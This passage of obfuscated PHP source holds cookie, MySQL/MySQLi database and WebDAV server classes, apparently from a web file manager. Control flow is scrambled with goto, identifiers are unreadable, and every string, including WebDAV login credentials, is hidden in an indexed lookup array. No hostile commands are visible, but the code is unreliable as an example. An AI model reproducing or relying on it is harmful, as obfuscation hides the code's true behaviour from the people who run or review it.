. $A§ò­›§‹´, !1, !1, $eŒÖ¤¶ó‹â); goto dŸå™ò”õĞ; a¶’÷¿İ¸: $Bá±í›øÇÇ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$AóñÕÆË°†) { $AóñÕÆË°† = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$CÚ´‹®ÀÕ]) && self::$sameCookieSet[$CÚ´‹®ÀÕ] == $bİæíŒë¢µ . $AóñÕÆË°†) { return; } goto f»Ù‘İøìÉ; dŸå™ò”õĞ: } public static function setSafe($A éíåšğä, $E¡¨¬ŠËÈ, $a¯äôòË¶ = 0) { self::set($A éíåšğä, $E¡¨¬ŠËÈ, $a¯äôòË¶, !0); } public static function get($AÌÀ®é £±) { return isset($_COOKIE[$AÌÀ®é £±]) ? $_COOKIE[$AÌÀ®é £±] : !1; } public static function remove($d¸‡Ê´‹µÜ, $fƒ…Œâˆ = false) { unset($_COOKIE[$d¸‡Ê´‹µÜ]); self::set($d¸‡Ê´‹µÜ, $_SERVER[çŞáÓæÚô‚Ô‡][43], 1, $fƒ…Œâˆ); } } class DbMysql extends Db { public function __construct($a³è²¯Ğ¦¸ = '') { $dÙ¨Å‡¤ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!extension_loaded($dÙ¨Å‡¤[736])) { think_exception(think_lang($dÙ¨Å‡¤[20]) . $dÙ¨Å‡¤[804]); } if (!empty($a³è²¯Ğ¦¸)) { $this->config = $a³è²¯Ğ¦¸; if (empty($this->config[$dÙ¨Å‡¤[23]])) { $this->config[$dÙ¨Å‡¤[23]] = $dÙ¨Å‡¤[43]; } } } public function connect($A«°ñ´»øš = '', $cÇˆÊì…³Š = 0, $dæÃÇ‰ññÛ = false) { $AË÷²½âáÀ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->linkID[$cÇˆÊì…³Š])) { goto a…»¼Ôê…; FÀŠòÎİÔ÷: if (1 != think_config($AË÷²½âáÀ[28])) { unset($this->config); } goto dã”¤á×İæ; a…»¼Ôê…: if (empty($A«°ñ´»øš)) { $A«°ñ´»øš = $this->config; } $D¦Ğ¤ñ¼Ï = $A«°ñ´»øš[$AË÷²½âáÀ[805]] . ($A«°ñ´»øš[$AË÷²½âáÀ[806]] ? "\x3a{$A«°ñ´»øš[$AË÷²½âáÀ[806]]}" : $AË÷²½âáÀ[43]); $eâŠÛ›ÀÚ = !empty($A«°ñ´»øš[$AË÷²½âáÀ[23]][$AË÷²½âáÀ[24]]) ? $A«°ñ´»øš[$AË÷²½âáÀ[23]][$AË÷²½âáÀ[24]] : $this->pconnect; goto fÕÔö°ŒÃÕ; b«ˆ™Ü—¤š: mysql_query($AË÷²½âáÀ[809] . think_config($AË÷²½âáÀ[810]) . $AË÷²½âáÀ[65], $this->linkID[$cÇˆÊì…³Š]); if ($f–‘¶˜Æö > $AË÷²½âáÀ[811]) { mysql_query($AË÷²½âáÀ[812], $this->linkID[$cÇˆÊì…³Š]); } $this->connected = !0; goto FÀŠòÎİÔ÷; fÕÔö°ŒÃÕ: if ($eâŠÛ›ÀÚ) { $this->linkID[$cÇˆÊì…³Š] = mysql_pconnect($D¦Ğ¤ñ¼Ï, $A«°ñ´»øš[$AË÷²½âáÀ[807]], $A«°ñ´»øš[$AË÷²½âáÀ[808]], 131072); } else { $this->linkID[$cÇˆÊì…³Š] = mysql_connect($D¦Ğ¤ñ¼Ï, $A«°ñ´»øš[$AË÷²½âáÀ[807]], $A«°ñ´»øš[$AË÷²½âáÀ[808]], !0, 131072); } if (!$this->linkID[$cÇˆÊì…³Š] || !empty($A«°ñ´»øš[$AË÷²½âáÀ[27]]) && !mysql_select_db($A«°ñ´»øš[$AË÷²½âáÀ[27]], $this->linkID[$cÇˆÊì…³Š])) { think_exception(mysql_error()); } $f–‘¶˜Æö = mysql_get_server_info($this->linkID[$cÇˆÊì…³Š]); goto b«ˆ™Ü—¤š; dã”¤á×İæ: } return $this->linkID[$cÇˆÊì…³Š]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($cñˆ¿£‹Ã¬) { goto FŒ‰ô±ÊŒã; f›Û’¥‚: think_action_status($FôøŒ™‹êÉ[29], 1); think_status($FôøŒ™‹êÉ[30]); $this->queryID = mysql_query($cñˆ¿£‹Ã¬, $this->_linkID); goto c£Ïº°©êµ; FŒ‰ô±ÊŒã: $FôøŒ™‹êÉ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (0 === stripos($cñˆ¿£‹Ã¬, $FôøŒ™‹êÉ[261])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto C¾Ÿ±¢Úá»; C¾Ÿ±¢Úá»: if (!$this->_linkID) { return !1; } $this->queryStr = $cñˆ¿£‹Ã¬; if ($this->queryID) { $this->free(); } goto f›Û’¥‚; c£Ïº°©êµ: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f••¬‰ì‡Á; f••¬‰ì‡Á: } public function execute($D’‡…—ª‹) { goto b“Ï¹ºÛ×Æ; b“Ï¹ºÛ×Æ: $BœÍ¿©¨„¦ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto e·²›öÅÂ¤; dš’ÄºÎŸ´: if (!1 === $B÷Ï…½¬«•) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto e°®°Ä; e·²›öÅÂ¤: $this->queryStr = $D’‡…—ª‹; if ($this->queryID) { $this->free(); } think_action_status($BœÍ¿©¨„¦[31], 1); goto CÁĞŒ› —; CÁĞŒ› —: think_status($BœÍ¿©¨„¦[30]); $B÷Ï…½¬«• = mysql_query($D’‡…—ª‹, $this->_linkID); $this->debug(); goto dš’ÄºÎŸ´; e°®°Ä: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[çŞáÓæÚô‚Ô‡][813], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CôÁºˆ‘ƒ = mysql_query($_SERVER[çŞáÓæÚô‚Ô‡][814], $this->_linkID); $this->transTimes = 0; if (!$CôÁºˆ‘ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Aàğ÷ïÚ­Û = mysql_query($_SERVER[çŞáÓæÚô‚Ô‡][815], $this->_linkID); $this->transTimes = 0; if (!$Aàğ÷ïÚ­Û) { $this->error(); return !1; } } return !0; } private function getAll() { $BëÄË©’ö– = array(); if ($this->numRows > 0) { while ($a—š‡Óùˆ‡ = mysql_fetch_assoc($this->queryID)) { $BëÄË©’ö–[] = $a—š‡Óùˆ‡; } mysql_data_seek($this->queryID, 0); } return $BëÄË©’ö–; } public function getFields($f¼—ô˜Ö×¸) { $e¤Ë¦â—ëÃ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¨â†„µÔ = $this->query($e¤Ë¦â—ëÃ[816] . $this->parseKey($f¼—ô˜Ö×¸)); $B†Ç—è¨ ù = array(); if ($D¨â†„µÔ) { foreach ($D¨â†„µÔ as $C¶Ö²êÀƒ¤ => $DË—ßì¹ÁŞ) { $B†Ç—è¨ ù[$DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[37]]] = array($e¤Ë¦â—ëÃ[38] => $DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[37]], $e¤Ë¦â—ëÃ[39] => $DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[40]], $e¤Ë¦â—ëÃ[41] => (bool) (strtoupper($DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[42]]) === $e¤Ë¦â—ëÃ[817]), $e¤Ë¦â—ëÃ[44] => $DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[45]], $e¤Ë¦â—ëÃ[46] => strtolower($DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[47]]) == $e¤Ë¦â—ëÃ[48], $e¤Ë¦â—ëÃ[49] => strtolower($DË—ßì¹ÁŞ[$e¤Ë¦â—ëÃ[50]]) == $e¤Ë¦â—ëÃ[51]); } } return $B†Ç—è¨ ù; } public function getTables($e¸ÒÒ¨ÈÍ = '') { $e‚³åïóŒ‚ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!empty($e¸ÒÒ¨ÈÍ)) { $aœèª¦½¥Š = $e‚³åïóŒ‚[818] . $e¸ÒÒ¨ÈÍ; } else { $aœèª¦½¥Š = $e‚³åïóŒ‚[819]; } $Cëé²»±…Ø = $this->query($aœèª¦½¥Š); $E˜‘ˆ×ê… = array(); foreach ($Cëé²»±…Ø as $Cæ¶…¥©‹„ => $Aî¹¤å­Ü) { $E˜‘ˆ×ê…[$Cæ¶…¥©‹„] = current($Aî¹¤å­Ü); } return $E˜‘ˆ×ê…; } public function replace($cˆ’»‚ì”‘, $D´ÉĞªù“ì = array()) { $a¢¹Â«í­ =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($cˆ’»‚ì”‘ as $bÙ«Á÷¤¡ => $aìæò‚ö—) { $dŒ˜Ù»»ˆµ = $this->parseValue($aìæò‚ö—); if (is_scalar($dŒ˜Ù»»ˆµ)) { $d¹˜õ¡äî[] = $dŒ˜Ù»»ˆµ; $dÈÀ¼¨ñØ¿[] = $this->parseKey($bÙ«Á÷¤¡); } } $fÌÇ‚¤‚›Ï = $a¢¹Â«í­[820] . $this->parseTable($D´ÉĞªù“ì[$a¢¹Â«í­[276]]) . $a¢¹Â«í­[821] . implode($a¢¹Â«í­[57], $dÈÀ¼¨ñØ¿) . $a¢¹Â«í­[822] . implode($a¢¹Â«í­[57], $d¹˜õ¡äî) . $a¢¹Â«í­[823]; return $this->execute($fÌÇ‚¤‚›Ï); } public function insertAll($b“øšÇ—î“, $CÃâŞŠˆ© = array(), $A§¯ÇĞø£ = false) { goto f¬²•îÙ¤; F„â¹ÎÒ®ƒ: $C°´Ø£±ë› = ($A§¯ÇĞø£ ? $B˜È·¹¶œ[825] : $B˜È·¹¶œ[826]) . $B˜È·¹¶œ[827] . $this->parseTable($CÃâŞŠˆ©[$B˜È·¹¶œ[276]]) . $B˜È·¹¶œ[821] . implode($B˜È·¹¶œ[57], $bµºŸ²Ò£ğ) . $B˜È·¹¶œ[828] . implode($B˜È·¹¶œ[57], $A¸…”øƒİ¸); return $this->execute($C°´Ø£±ë›); goto d‘îÇ ¡±º; f¬²•îÙ¤: $B˜È·¹¶œ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!is_array($b“øšÇ—î“[0])) { return !1; } $bµºŸ²Ò£ğ = array_keys($b“øšÇ—î“[0]); goto BÖ¬ó¹â‰ì; BÖ¬ó¹â‰ì: $A¸…”øƒİ¸ = array(); foreach ($b“øšÇ—î“ as $AŒ‰¬µÛò) { $A†Á„½Ğ»ï = array(); foreach ($AŒ‰¬µÛò as $Bí¶…”²™è => $Fß©÷ˆóÄÚ) { $Fß©÷ˆóÄÚ = $this->parseValue($Fß©÷ˆóÄÚ); if (is_scalar($Fß©÷ˆóÄÚ)) { $A†Á„½Ğ»ï[] = $Fß©÷ˆóÄÚ; } } $A¸…”øƒİ¸[] = $B˜È·¹¶œ[257] . implode($B˜È·¹¶œ[57], $A†Á„½Ğ»ï) . $B˜È·¹¶œ[823]; } array_walk($bµºŸ²Ò£ğ, array($this, $B˜È·¹¶œ[824])); goto F„â¹ÎÒ®ƒ; d‘îÇ ¡±º: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $cø›¶äôÓ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->error = mysql_errno() . $cø›¶äôÓ[4] . mysql_error($this->_linkID); if ($cø›¶äôÓ[43] != $this->queryStr) { $this->error .= LNG($cø›¶äôÓ[55]) . $this->queryStr; } think_trace($this->error, $cø›¶äôÓ[43], $cø›¶äôÓ[56]); return $this->error; } public function escapeString($f·ˆëŸø‰) { if ($this->_linkID) { return mysql_real_escape_string($f·ˆëŸø‰, $this->_linkID); } else { return mysql_escape_string($f·ˆëŸø‰); } } public function parseKey(&$DãªÔ¨°Õ, $BÀÜæ°é = true) { $cŠçÇ¶´‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($BÀÜæ°é) { $DãªÔ¨°Õ = $this->parseKeyCheck($DãªÔ¨°Õ); } if ($DãªÔ¨°Õ != $cŠçÇ¶´‹[186] && !preg_match($cŠçÇ¶´‹[829], $DãªÔ¨°Õ)) { $DãªÔ¨°Õ = $cŠçÇ¶´‹[830] . trim($DãªÔ¨°Õ, $cŠçÇ¶´‹[830]) . $cŠçÇ¶´‹[830]; } return $DãªÔ¨°Õ; } } class DbMysqli extends Db { public function __construct($F´¶ñæÀ¬ = '') { $dÀ’“ºİ— =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!extension_loaded($dÀ’“ºİ—[735])) { think_exception(think_lang($dÀ’“ºİ—[20]) . $dÀ’“ºİ—[831]); } if (!empty($F´¶ñæÀ¬)) { $this->config = $F´¶ñæÀ¬; if (empty($this->config[$dÀ’“ºİ—[23]])) { $this->config[$dÀ’“ºİ—[23]] = $dÀ’“ºİ—[43]; } } } public function connect($cùğ¥›ùÙå = '', $E¶ƒà‚ÁôÁ = 0) { $B¶‰¸ï¿ÏÛ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->linkID[$E¶ƒà‚ÁôÁ])) { goto fÒ×‡ŒÃË; EÜò‡˜ÙÇÑ: $cŸ²º³ÜÄ = $this->linkID[$E¶ƒà‚ÁôÁ]->server_version; $this->linkID[$E¶ƒà‚ÁôÁ]->query($B¶‰¸ï¿ÏÛ[809] . think_config($B¶‰¸ï¿ÏÛ[810]) . $B¶‰¸ï¿ÏÛ[65]); if ($cŸ²º³ÜÄ > $B¶‰¸ï¿ÏÛ[811]) { $this->linkID[$E¶ƒà‚ÁôÁ]->query($B¶‰¸ï¿ÏÛ[812]); } goto B±à‰éçê; fÒ×‡ŒÃË: if (empty($cùğ¥›ùÙå)) { $cùğ¥›ùÙå = $this->config; } $this->linkID[$E¶ƒà‚ÁôÁ] = new mysqli($cùğ¥›ùÙå[$B¶‰¸ï¿ÏÛ[805]], $cùğ¥›ùÙå[$B¶‰¸ï¿ÏÛ[807]], $cùğ¥›ùÙå[$B¶‰¸ï¿ÏÛ[808]], $cùğ¥›ùÙå[$B¶‰¸ï¿ÏÛ[27]], $cùğ¥›ùÙå[$B¶‰¸ï¿ÏÛ[806]] ? intval($cùğ¥›ùÙå[$B¶‰¸ï¿ÏÛ[806]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto EÜò‡˜ÙÇÑ; B±à‰éçê: $this->connected = !0; if (1 != think_config($B¶‰¸ï¿ÏÛ[28])) { unset($this->config); } goto BñÂÚ—Ô†¬; BñÂÚ—Ô†¬: } return $this->linkID[$E¶ƒà‚ÁôÁ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($A›Á”ñÏè¶) { goto fŸËè‹—Â¸; C»ƒÀ¼£é: think_status($fìŠÂĞ®¯[30]); $this->queryID = $this->_linkID->query($A›Á”ñÏè¶); if ($this->_linkID->more_results()) { while (($E¶å¼•¯¦É = $this->_linkID->next_result()) != NULL) { $E¶å¼•¯¦É->free_result(); } } goto cÕ—ÎèÅ‡Í; fŸËè‹—Â¸: $fìŠÂĞ®¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto CÁ¶µ¹; CÁ¶µ¹: $this->queryStr = $A›Á”ñÏè¶; if ($this->queryID) { $this->free(); } think_action_status($fìŠÂĞ®¯[29], 1); goto C»ƒÀ¼£é; cÕ—ÎèÅ‡Í: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto b„‘¶ÚÄŒ; b„‘¶ÚÄŒ: } public function execute($d¼ğ’íŒ²â) { goto B²Û‹˜ŸË; Aõå¼¿Ù·–: think_status($DÀææ”•°Í[30]); $CšÇÆ±ê¥ = $this->_linkID->query($d¼ğ’íŒ²â); $this->debug(); goto aÁ¤Ë»Õ´™; aÁ¤Ë»Õ´™: if (!1 === $CšÇÆ±ê¥) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto C’“°„Ê™×; B²Û‹˜ŸË: $DÀææ”•°Í =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Eä¤œ °; Eä¤œ °: $this->queryStr = $d¼ğ’íŒ²â; if ($this->queryID) { $this->free(); } think_action_status($DÀææ”•°Í[31], 1); goto Aõå¼¿Ù·–; C’“°„Ê™×: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $E˜Ó´ğ¤‘ƒ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$E˜Ó´ğ¤‘ƒ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $FÖë±‡ÆÖÜ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$FÖë±‡ÆÖÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $f‚µÏ†á­‰ = array(); if ($this->numRows > 0) { for ($d…ß˜–ÎŸâ = 0; $d…ß˜–ÎŸâ < $this->numRows; $d…ß˜–ÎŸâ++) { $f‚µÏ†á­‰[$d…ß˜–ÎŸâ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $f‚µÏ†á­‰; } public function getFields($e˜‹æõÜ–) { $B’‚àÛÊÂ© =& $_SERVER[çŞáÓæÚô‚Ô‡]; $CÕ³ÏÑ¿Ù‚ = $this->query($B’‚àÛÊÂ©[816] . $this->parseKey($e˜‹æõÜ–)); $B±ª±‚èœ = array(); if ($CÕ³ÏÑ¿Ù‚) { foreach ($CÕ³ÏÑ¿Ù‚ as $B‘‹‘…‰ï => $eßĞ¬µæ¿‡) { $B±ª±‚èœ[$eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[37]]] = array($B’‚àÛÊÂ©[38] => $eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[37]], $B’‚àÛÊÂ©[39] => $eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[40]], $B’‚àÛÊÂ©[41] => (bool) ($eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[42]] === $B’‚àÛÊÂ©[43]), $B’‚àÛÊÂ©[44] => $eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[45]], $B’‚àÛÊÂ©[46] => strtolower($eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[47]]) == $B’‚àÛÊÂ©[48], $B’‚àÛÊÂ©[49] => strtolower($eßĞ¬µæ¿‡[$B’‚àÛÊÂ©[50]]) == $B’‚àÛÊÂ©[51]); } } return $B±ª±‚èœ; } public function getTables($DÓì„Æ‘¬¶ = '') { $b²Ú¸…Œˆ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B‹³Îé¯‰Í = !empty($DÓì„Æ‘¬¶) ? $b²Ú¸…Œˆ[818] . $DÓì„Æ‘¬¶ : $b²Ú¸…Œˆ[819]; $C†ğ™Ëãï = $this->query($B‹³Îé¯‰Í); $F‹ø·İŒÀ = array(); if ($C†ğ™Ëãï) { foreach ($C†ğ™Ëãï as $c×øÚ®©… => $c³õ°¸†¶Ê) { $F‹ø·İŒÀ[$c×øÚ®©…] = current($c³õ°¸†¶Ê); } } return $F‹ø·İŒÀ; } public function replace($AÕßçˆ°Ëî, $D½¹„×Œ¯ = array()) { $FµÑ¥õ  =& $_SERVER[çŞáÓæÚô‚Ô‡]; foreach ($AÕßçˆ°Ëî as $C’æöõ¸áê => $DĞß·«) { $FÍ“„¥„Ì¿ = $this->parseValue($DĞß·«); if (is_scalar($FÍ“„¥„Ì¿)) { $d¬ŸøŞ¬[] = $FÍ“„¥„Ì¿; $aíôÕ£¸ö[] = $this->parseKey($C’æöõ¸áê); } } $B´µœŞÏ¯Æ = $FµÑ¥õ [820] . $this->parseTable($D½¹„×Œ¯[$FµÑ¥õ [276]]) . $FµÑ¥õ [821] . implode($FµÑ¥õ [57], $aíôÕ£¸ö) . $FµÑ¥õ [822] . implode($FµÑ¥õ [57], $d¬ŸøŞ¬) . $FµÑ¥õ [823]; return $this->execute($B´µœŞÏ¯Æ); } public function insertAll($D¨©ìÒİÕø, $FÇåÁÛê = array(), $fóá‘ôáäŞ = false) { goto fùÆ÷ß‘öŸ; d‘Š–ç‹: $C¦¬ºñôÊ = array(); foreach ($D¨©ìÒİÕø as $a–ŠˆöæŠİ) { $E÷–Å–®ËÌ = array(); foreach ($a–ŠˆöæŠİ as $d«¼‘ëÂ => $c×ºÛ ‰”ò) { $c×ºÛ ‰”ò = $this->parseValue($c×ºÛ ‰”ò); if (is_scalar($c×ºÛ ‰”ò)) { $E÷–Å–®ËÌ[] = $c×ºÛ ‰”ò; } } $C¦¬ºñôÊ[] = $B¼™È¢Îòä[257] . implode($B¼™È¢Îòä[57], $E÷–Å–®ËÌ) . $B¼™È¢Îòä[823]; } array_walk($dçÜ¥»İ‡°, array($this, $B¼™È¢Îòä[824])); goto céµ’¬Ô…¶; céµ’¬Ô…¶: $aÂó‹†Çõ° = ($fóá‘ôáäŞ ? $B¼™È¢Îòä[825] : $B¼™È¢Îòä[826]) . $B¼™È¢Îòä[827] . $this->parseTable($FÇåÁÛê[$B¼™È¢Îòä[276]]) . $B¼™È¢Îòä[821] . implode($B¼™È¢Îòä[57], $dçÜ¥»İ‡°) . $B¼™È¢Îòä[828] . implode($B¼™È¢Îòä[57], $C¦¬ºñôÊ); return $this->execute($aÂó‹†Çõ°); goto eãº‰Îã; fùÆ÷ß‘öŸ: $B¼™È¢Îòä =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!is_array($D¨©ìÒİÕø[0])) { return !1; } $dçÜ¥»İ‡° = array_keys($D¨©ìÒİÕø[0]); goto d‘Š–ç‹; eãº‰Îã: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $bŸÕªªø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->error = $this->_linkID->errno . $bŸÕªªø[4] . $this->_linkID->error; if ($bŸÕªªø[43] != $this->queryStr) { $this->error .= LNG($bŸÕªªø[55]) . $this->queryStr; } think_trace($this->error, $bŸÕªªø[43], $bŸÕªªø[56]); return $this->error; } public function escapeString($e öÄä‚°«) { if ($this->_linkID) { return $this->_linkID->real_escape_string($e öÄä‚°«); } else { return addslashes($e öÄä‚°«); } } public function parseKey(&$Bœçëœ²Ë´, $E¯‡Û¯Å¹‹ = true) { $fÇ’‹†÷Ğ‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($E¯‡Û¯Å¹‹) { $Bœçëœ²Ë´ = $this->parseKeyCheck($Bœçëœ²Ë´); } if ($Bœçëœ²Ë´ != $fÇ’‹†÷Ğ‰[186] && !preg_match($fÇ’‹†÷Ğ‰[829], $Bœçëœ²Ë´)) { $Bœçëœ²Ë´ = $fÇ’‹†÷Ğ‰[830] . trim($Bœçëœ²Ë´, $fÇ’‹†÷Ğ‰[830]) . $fÇ’‹†÷Ğ‰[830]; } return $Bœçëœ²Ë´; } } goto b›¿‡İ°Ú¹; B‰²±©ßÛ…: class HttpDavServer { public function __construct($Aâ…Â¡®‘É, $Aìëè‚×ìƒ) { $this->root = $Aâ…Â¡®‘É; $this->initPath($Aìëè‚×ìƒ); $this->start(); } public function initPath($C³­ø¡Ÿ¶‰) { $e§º×Ï¤Ø =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bä³¶ÔéŸ = rtrim($_SERVER[$e§º×Ï¤Ø[1394]], $e§º×Ï¤Ø[18]) . $e§º×Ï¤Ø[18]; $this->urlBase = substr($bä³¶ÔéŸ, 0, strpos($bä³¶ÔéŸ, $C³­ø¡Ÿ¶‰) + 1); $this->urlBase = rtrim($this->urlBase, $e§º×Ï¤Ø[18]) . $C³­ø¡Ÿ¶‰; $this->path = $this->parsePath($this->pathGet()); } public function checkUser() { $E¢‹Ûò³¾ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÍÈÈÜ—ğÒ = HttpAuth::get(); if ($bÍÈÈÜ—ğÒ[$E¢‹Ûò³¾[546]] == $E¢‹Ûò³¾[1791] && $bÍÈÈÜ—ğÒ[$E¢‹Ûò³¾[903]] == $E¢‹Ûò³¾[1792]) { return !0; } HttpAuth::error(); } public function start() { goto F‡ãßÍ¥ÓÄ; CŠ±§¬â: if (!method_exists($this, $aº­£áÁ™³)) { pr($aº­£áÁ™³ . $cä±ÆŸ ß¹[1793]); die; } $A„åæøë²² = array($cä±ÆŸ ß¹[1794], $cä±ÆŸ ß¹[1795]); if (!in_array($aº­£áÁ™³, $A„åæøë²²) && !$this->pathExists($this->path)) { $EÕì‹ëİ»Ú = array($cä±ÆŸ ß¹[1039] => 404); } else { $EÕì‹ëİ»Ú = $this->{$aº­£áÁ™³}(); } goto DÍ×£Ù¾ÓÕ; F‡ãßÍ¥ÓÄ: $cä±ÆŸ ß¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->checkUser(); $aº­£áÁ™³ = $cä±ÆŸ ß¹[154] . HttpHeader::method(); goto CŠ±§¬â; DÍ×£Ù¾ÓÕ: if (!$EÕì‹ëİ»Ú) { return; } self::response($EÕì‹ëİ»Ú); goto D˜ãŠªˆ; D˜ãŠªˆ: } public function pathGet($E‘Á¸•ğ¨ = false) { $D¼¿Õ„ªÜ‰ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÇ‚²êÈ‰³ = $E‘Á¸•ğ¨ ? $_SERVER[$D¼¿Õ„ªÜ‰[1796]] : $_SERVER[$D¼¿Õ„ªÜ‰[1394]]; $AÇ‚²êÈ‰³ = KodIO::clear(rawurldecode($AÇ‚²êÈ‰³)); if (!strstr($AÇ‚²êÈ‰³, KodIO::clear($this->urlBase))) { return !1; } return substr($AÇ‚²êÈ‰³, strpos($AÇ‚²êÈ‰³, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($aï•Ÿ’¹Ÿ¦) { return file_exists($aï•Ÿ’¹Ÿ¦); } public function pathMkdir($A†ÏÊ…î‚) { return mkdir($A†ÏÊ…î‚, 511, !0); } public function pathInfo($EÚÍ„öÕØ÷) { return path_info($EÚÍ„öÕØ÷); } public function pathList($Cì‰ñçš¶Î) { return path_list($Cì‰ñçš¶Î); } public function pathOut($b½Ë÷˜½») { echo file_get_contents($b½Ë÷˜½»); } public function pathPut($e²ğ……“ò, $EØ®ÀÏ¡ = '') { if (!$EØ®ÀÏ¡) { return file_put_contents($e²ğ……“ò, $_SERVER[çŞáÓæÚô‚Ô‡][43]); } return move_path($EØ®ÀÏ¡, $e²ğ……“ò); } public function pathRemove($DÁ‡ÁÌ„ß) { if (is_file($DÁ‡ÁÌ„ß)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($CÕí÷õğ§°, $dÀ‘˜©„ƒõ) { return move_path($CÕí÷õğ§°, $dÀ‘˜©„ƒõ); } public function pathCopy($DùÖØ„Á‹•, $e Á¼¿œàò) { return copy_dir($DùÖØ„Á‹•, $e Á¼¿œàò); } public function parsePath($D‹÷¿å±ç¼) { return $D‹÷¿å±ç¼; } public function parseItem($C…êî½Î™, $b»¾Š™ºŠ¼) { goto eŞ”˜ÊÆ™; Aƒ‘š©Ş Ş: if ($b»¾Š™ºŠ¼) { $BÒ—Îéî¶÷ = $Bí“åˆ„…¿[18] . str_replace($Bí“åˆ„…¿[182], $Bí“åˆ„…¿[18], rawurlencode($this->pathGet())); } if (!trim($C…êî½Î™[$Bí“åˆ„…¿[117]])) { $C…êî½Î™[$Bí“åˆ„…¿[117]] = time(); } if (!trim($C…êî½Î™[$Bí“åˆ„…¿[197]])) { $C…êî½Î™[$Bí“åˆ„…¿[197]] = time(); } goto b²…˜©“³™; eŞ”˜ÊÆ™: $Bí“åˆ„…¿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÒ—Îéî¶÷ = $this->pathGet() . $Bí“åˆ„…¿[18] . $C…êî½Î™[$Bí“åˆ„…¿[38]]; $BÒ—Îéî¶÷ = $Bí“åˆ„…¿[18] . str_replace($Bí“åˆ„…¿[182], $Bí“åˆ„…¿[18], rawurlencode($BÒ—Îéî¶÷)); goto Aƒ‘š©Ş Ş; b²…˜©“³™: $a…›óËÇæ¯ = array($Bí“åˆ„…¿[1797] => KodIO::clear($this->urlBase . $BÒ—Îéî¶÷), $Bí“åˆ„…¿[117] => @gmdate($Bí“åˆ„…¿[1798], $C…êî½Î™[$Bí“åˆ„…¿[117]]), $Bí“åˆ„…¿[197] => @gmdate($Bí“åˆ„…¿[1799], $C…êî½Î™[$Bí“åˆ„…¿[197]]), $Bí“åˆ„…¿[87] => $C…êî½Î™[$Bí“åˆ„…¿[87]] ? $C…êî½Î™[$Bí“åˆ„…¿[87]] : 0); return $a…›óËÇæ¯; goto eî¢æ¯Ö¡Ó; eî¢æ¯Ö¡Ó: } public function parseItemXml($AÓ†Ş¸š , $a‰Å®Áí) { $Aªƒ‹ã½æé =& $_SERVER[çŞáÓæÚô‚Ô‡]; $eª©ì¯é·§ = $this->parseItem($AÓ†Ş¸š , $a‰Å®Áí); if ($AÓ†Ş¸š [$Aªƒ‹ã½æé[39]] == $Aªƒ‹ã½æé[86]) { $b®•¨¿»ùš = 